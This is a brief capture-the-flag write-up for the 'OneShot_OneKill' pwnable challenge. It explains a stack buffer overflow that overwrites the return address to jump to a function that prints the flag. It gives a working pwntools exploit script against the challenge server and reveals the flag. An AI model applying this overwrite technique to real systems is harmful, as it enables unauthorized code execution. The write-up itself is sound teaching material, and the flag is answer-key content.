# OneShot_OneKill

## Pwnable - Points: 1

> You have just one bullet.... kill him!
>
> Author: Y311J(신재욱)
>
> 
>
> nc prob.vulnerable.kr 20026
>
> [oneshot_onekill](oneshot_onekill)
>

Overflow the buffer with 300 bytes + 4 bytes EBP to get code execution. The binary contains a function `oneshot`, that does `cat flag`, so simply jump to it.

Exploit script:

```python
from pwn import *

# p = process('oneshot_onekill')
p = remote('prob.vulnerable.kr', 20026)

oneshot = 0x80485a5

p.sendline('A' * 300 + 'A' * 4 + p32(oneshot))
print p.recvall()
```

flag: `KorNewbie{Nice_Sh0T_N3wbie_Pwner!$#}`